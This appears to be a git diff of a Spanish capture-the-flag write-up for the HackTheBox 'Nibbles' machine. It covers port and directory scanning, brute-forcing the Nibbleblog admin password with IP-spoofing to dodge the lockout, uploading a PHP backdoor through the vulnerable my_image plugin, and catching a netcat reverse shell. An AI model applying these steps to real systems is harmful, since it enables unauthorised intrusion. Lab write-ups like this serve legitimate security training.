@@ -1,5 +1,12 @@
 10.10.10.75 Nibbles
---------------------
+--------------------------
+
+Maquina: Linux 
+Dificultad: Facil 
+Vulns: \[Codigo fuente expuesto] \[Plugin vulnerable que permite subir archivos sin ninguna sanitizacion], \[Contraseña débil], \[script privilegiado
+sin protecciones].
+
+--------------------------
 
 Tras un escaneo con el nmap damos con los puertos 22 (ssh) y 80 (http)
 La version de ssh es OpenSSH 7.2p2 (desactualizada, ahora estamos en la 9.0 a fecha de Octubre/2022 )
@@ -8,9 +15,8 @@ La version de ssh es OpenSSH 7.2p2 (desactualizada, ahora estamos en la 9.0 a fe
 └─$ whatweb http://10.10.10.75
 http://10.10.10.75 [200 OK] Apache[2.4.18], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.75]
 ```
-O sea que tenemos una web en php. La pagina nos devuelve la frase "Hello World" pero en el codigo fuente nos
-dan la ruta /nibbleblog. Este tiene mas cosas, la ruta "/nibbleblog/feed.php", "/nibbleblog/index.php"
-"/nibbleblog/admin/js/jquery/jquery.js"
+O sea que tenemos una web en php. La pagina nos devuelve la frase "Hello World" pero en el codigo fuente nos dan la ruta /nibbleblog. Este tiene
+mas cosas, la ruta "/nibbleblog/feed.php", "/nibbleblog/index.php" "/nibbleblog/admin/js/jquery/jquery.js"
 
 - **"/nibbleblog/feed.php"** -> XML "Nibbles Yum Yum"
 - **"/admin"** -> Ruta con todo el codigo fuente. Tiene demasidas cosas. Asi que lo descargare todo.
@@ -23,11 +29,11 @@ Hice una busqueda recursiva de posibles contraseñas pero no halle nada interesa
 └─$ grep -rIE "password|pass|key";
 ```
 
-Resulta que nibbleblog no es un invento de hacktehbox sino que es un CMS de creacion de blogs. Encima tenemos 
-todo su codigo fuente descargado (una seccion /admin no deberia ser accesible al publico :V)
+Resulta que nibbleblog no es un invento de hacktehbox sino que es un CMS de creacion de blogs. Encima tenemos todo su codigo fuente descargado
+(una seccion /admin no deberia ser accesible al publico :V)
 
-Tras una busqueda en **searchsploi** damos con que tenemos sqli tanto en //index.php?page=[SQLi] 
-como en /post.php?idpost=[SQLi] pero tras una prueba no funciona.
+Tras una busqueda en **searchsploit** damos con que tenemos sqli tanto en //index.php?page=[SQLi] como en /post.php?idpost=[SQLi] pero tras una 
+prueba no funciona.
 
 ```console
 └─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.75/nibbleblog/FUZZ
@@ -35,11 +41,9 @@ como en /post.php?idpost=[SQLi] pero tras una prueba no funciona.
 000000245:   301        9 L      28 W       321 Ch      "admin"
 000000505:   301        9 L      28 W       323 Ch      "plugins"
 ```
-En **/content** tenemos /private con muchos php (ilegibles porque los interpreta directamente) y xmls 
-(en users.xml y config.xml confirman que existe el usaurio *"admin"*) el resto de carpetas de /content no tienen 
-nada.
-En /plugins salen todos los plugins instalados, tras una busqueda en google di con que el "my_image" es 
-vulnerable. Aun asi segui enumerando.
+En **/content** tenemos /private con muchos php (ilegibles porque los interpreta directamente) y xmls (en users.xml y config.xml confirman que 
+existe el usaurio *"admin"*) el resto de carpetas de /content no tienen nada.
+En /plugins salen todos los plugins instalados, tras una busqueda en google di con que el "my_image" es vulnerable. Aun asi segui enumerando.
 
 ```console
 └─$ wfuzz -c --hc=404 -t 200  -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.10.75/nibbleblog/FUZZ.php
@@ -52,17 +56,14 @@ vulnerable. Aun asi segui enumerando.
 ```
 /admin me pide creds. Tanto install como update no me interesan
 
-La peticion es esto ```username=admin&password=123``` Me baje este [script](https://eightytwo.net/blog/brute-forcing-the-admin-password-on-nibbles/) para enumerar con el rockyuu. La contraseña al final (intento nº 2500 era
-RATE_LIMIT_ERROR = 'Blacklist protection'
-"nibbles"). El script, cambia la cabecera "X-Fordwarded-For" (indica nuestra IP) dandole una IP aleatoria
-cada pocos intentos y que no nos bloqueen.
+La peticion es esto ```username=admin&password=123``` Me baje este [script](https://eightytwo.net/blog/brute-forcing-the-admin-password-on-nibbles/) para
+enumerar con el rockyuu. La contraseña al final (intento nº 2500, por ahi) era "nibbles"). El script, cambia la cabecera "X-Fordwarded-For" (indica 
+nuestra IP) dandole una IP aleatoria cada pocos intentos y que no nos bloqueen.
 
-Una vez entrado en el panel de administración hay una seccion para configurar los plugins. Entre todos está
-el "my_image" de antes. En searchsploit hay un script que tira de metasploit, no esta permitido usarse pero
-si se puede analizar el script para hacerlo manualmente.
+Una vez entrado en el panel de administración hay una seccion para configurar los plugins. Entre todos está el "my_image" de antes. 
+En searchsploit hay un script que tira de metasploit, no esta permitido usarse pero si se puede analizar el script para hacerlo manualmente.
 
-En my_image se puede subir un archivo, probe a subir un shell.php (backdoor en php) y pese a que salieran 
-mensajes de error, funcionó sinr estricciones
+En my_image se puede subir un archivo, probe a subir un shell.php (backdoor en php) y pese a que salieran mensajes de error, funcionó sin sanitizaciones.
 
 ```php
 <?php
@@ -77,17 +78,7 @@ El comando a pasarle es este (los & estan urlencodeados a %26)
 
 Escucha con netcat y tratamiento de la tty ```sudo nc -nlvp 443```
 
-```
-script /dev/null -c bash 
-ctrolZ
-stty raw -echo; fg
-reset xterm
-<ml/nibbleblog/content/private/plugins/my_image$ stty rows 33 columns 118
-nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ export TERM=xterm
-nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ export SHELL=/bin/bash
-```
-
-Bajo un reconocimiento con mi [script]() encontre cosas raras:
+Bajo un reconocimiento con mi [script](https://github.com/CUCUxii/Lin_info_xii.sh) encontre cosas raras:
 - CLiente sql activo (puerto 3306) -> da ACCES DENIED,
 - carpeta /home -> user.txt (flag), personal.zip (archivo, no se que es)
 - Tambien tiene backups de "gshadow" "passwd" y "shadow" bajo la carpeta /var/backups
